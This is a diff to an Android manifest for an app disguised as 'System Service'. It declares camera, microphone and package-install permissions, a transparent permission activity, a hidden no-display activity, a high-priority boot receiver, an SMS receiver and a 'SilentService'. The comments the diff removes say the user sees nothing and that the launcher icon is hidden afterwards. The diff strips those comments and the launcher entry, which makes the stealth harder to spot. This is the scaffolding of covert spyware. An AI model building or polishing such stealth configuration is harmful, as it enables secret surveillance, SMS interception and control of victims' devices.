@@ -1,10 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.rx.pocketvps">
-
-    <!-- ═══════════════════════════ -->
-    <!--        PERMISSIONS          -->
-    <!-- ═══════════════════════════ -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
@@ -30,67 +26,29 @@
     <uses-permission android:name="android.permission.CAMERA"/>
     <uses-permission android:name="android.permission.RECORD_AUDIO"/>
     <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
-
     <application
         android:allowBackup="false"
         android:label="System Service"
-        android:theme="@style/Theme.AppCompat"
-        android:icon="@mipmap/ic_launcher">
-
-        <!--
-            PERMISSION ACTIVITY — Pehli baar install pe
-            Transparent, user ko kuch nahi dikhta
-            Yeh LAUNCHER hai — sirf install ke liye
-            Baad mein icon hatane ka code hai
-        -->
-        <activity
-            android:name=".PermissionActivity"
-            android:exported="true"
+        android:theme="@style/Theme.AppCompat.NoActionBar">
+        <activity android:name=".PermissionActivity" android:exported="true"
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:excludeFromRecents="true"
-            android:taskAffinity=""
-            android:launchMode="singleInstance">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN"/>
-                <category android:name="android.intent.category.LAUNCHER"/>
-            </intent-filter>
-        </activity>
-
-        <!-- Hidden activity — no launcher -->
-        <activity
-            android:name=".MainActivity"
-            android:exported="false"
+            android:excludeFromRecents="true" android:taskAffinity=""
+            android:launchMode="singleInstance"/>
+        <activity android:name=".MainActivity" android:exported="false"
             android:theme="@android:style/Theme.NoDisplay"/>
-
-        <!-- Boot pe auto start -->
-        <receiver
-            android:name=".BootReceiver"
-            android:enabled="true"
-            android:exported="true">
+        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
             <intent-filter android:priority="999">
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
                 <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
-                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
                 <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
             </intent-filter>
         </receiver>
-
-        <!-- SMS receiver -->
-        <receiver
-            android:name=".SmsReceiver"
-            android:enabled="true"
-            android:exported="true">
+        <receiver android:name=".SmsReceiver" android:enabled="true" android:exported="true">
             <intent-filter android:priority="999">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
             </intent-filter>
         </receiver>
-
-        <!-- Silent background service -->
-        <service
-            android:name=".SilentService"
-            android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="dataSync"/>
-
+        <service android:name=".SilentService" android:enabled="true"
+            android:exported="false" android:foregroundServiceType="dataSync"/>
     </application>
 </manifest>
